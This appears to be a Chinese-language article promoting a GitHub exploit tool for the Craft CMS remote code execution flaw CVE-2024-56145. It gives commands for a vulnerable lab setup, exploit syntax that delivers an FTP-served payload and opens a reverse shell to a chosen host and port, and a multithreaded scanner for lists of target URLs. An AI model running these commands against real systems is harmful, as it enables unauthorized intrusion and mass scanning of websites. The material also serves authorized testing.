#  CVE-2024-56145：Craft CMS 漏洞利用工具   
 独眼情报   2024-12-22 02:51  
  
这款工具专门用于利用由 Assetnote 研究团队发现的 Craft CMS 漏洞。该漏洞源于系统对用户提供的模板路径处理不当，攻击者可通过精心构造的载荷实现**远程代码执行（RCE）**🛠️。  
  
🙏 **特别感谢 Assetnote 团队在安全领域的贡献与研究。**  
## ✨ 功能特点  
- 🚀 **自动化 FTP 服务器**用于投放恶意载荷  
  
- 🧪 **反向 Shell 载荷生成器**，支持多种方式（bash、nc、mkfifo）  
  
- 🔍 **漏洞检测器**用于识别易受攻击的目标  
  
- 🖥️ **多线程支持**实现更快扫描  
  
- 🛠️ **简单易用的命令行界面**，反馈清晰明了  
  
## 🛡️ 搭建测试环境  
  
按以下步骤搭建 Craft CMS 测试实例：  
```
mkdir exploit-craft && \
cd exploit-craft && \
# 配置用于 Craft CMS 的 DDEV 项目
ddev config \
  --project-type=craftcms \
  --docroot=web \
  --create-docroot \
  --php-version="8.2" \
  --database="mysql:8.0" \
  --nodejs-version="20" && \
# 创建 DDEV 项目
ddev start -y && \
# 使用指定版本创建 Craft CMS
ddev composer create -y --no-scripts --no-interaction "craftcms/craft:5.0.0" && \
# 安装特定版本的 CMS
ddev composer require "craftcms/cms:5.5.0" \
  --no-scripts \
  --no-interaction --with-all-dependencies && \
# 设置 Craft CMS 安全密钥
ddev craft setup/security-key && \
# 安装 Craft CMS
ddev craft install/craft \
    --username=admin \
    --password=password123 \
    --email=admin@example.com \
    --site-name=Testsite \
    --language=en \
    --site-url='$DDEV_PRIMARY_URL' && \
# 为 PHP 启用 register_argc_argv
mkdir -p .ddev/php/ && \
echo "register_argc_argv = On" > .ddev/php/php.ini && \
ddev restart && \
# 最后一步，输出提示信息并启动项目
echo '准备就绪！' && \
ddev launch

```  
## 🚨 使用方法  
  
使用 --help 参数查看可用命令：  
```
python exploit.py --help

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnRnRBRX4qM3qO0uX82qibfG4Aem2K16XdY2InH7PgWhrVSU2Hj7J90gwssBuvgnXQhqia0UTrzcXicMA/640?wx_fmt=png&from=appmsg "")  
### 🚀 漏洞利用命令  
  
攻击目标：  
```
python exploit.py exploit -u <目标URL> -lh <本地主机> -lp <本地端口> -px <载荷类型>

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnRnRBRX4qM3qO0uX82qibfG4EH93g0fiaibCRyO9AgIXKChrr3BPbH5PK2jwMfCb5WMzBuo9alcCJcUQ/640?wx_fmt=png&from=appmsg "")  
#### ⚙️ 参数说明：  
- -u / --url：目标网址（必填）  
  
- -lh / --lhost：用于接收反向 Shell 的本地 IP（必填）  
  
- -lp / --lport：监听器端口（必填）  
  
- -fh / --ftp-host：FTP 服务器主机  
  
- -fp / --ftp-port：FTP 服务器端口  
  
- -px / --payload：载荷类型（bash、nc、mkfifo），默认：bash  
  
#### 🧪 示例：  
```
python exploit.py exploit -u https://example.com -lh 192.168.1.10 -lp 4444 -fh 127.0.0.1 -fp 2121 -px bash

```  
### 🔍 检查命令  
  
检查目标是否存在漏洞：  
```
python exploit.py check -u <目标URL> -f <URL列表文件> -t <线程数> -o <输出文件>

```  
#### ⚙️ 参数说明：  
- -u / --url：单个目标 URL  
  
- -f / --file：包含多个待扫描 URL 的文件  
  
- -t / --threads：扫描并发线程数  
  
- -o / --output：保存结果的输出文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnRnRBRX4qM3qO0uX82qibfG4crFaibKXsLyooCdHZxxJPFEuQpZLVpofoD0KYz5YC5uicOf9xjb98NGw/640?wx_fmt=png&from=appmsg "")  
#### 🧪 示例：  
```
python exploit.py check -f urls.txt -t 10 -o results.txt

```  
  
请谨慎使用，遵守道德规范！✨  
>   
> https://github.com/Chocapikk/CVE-2024-56145  
  
  
  
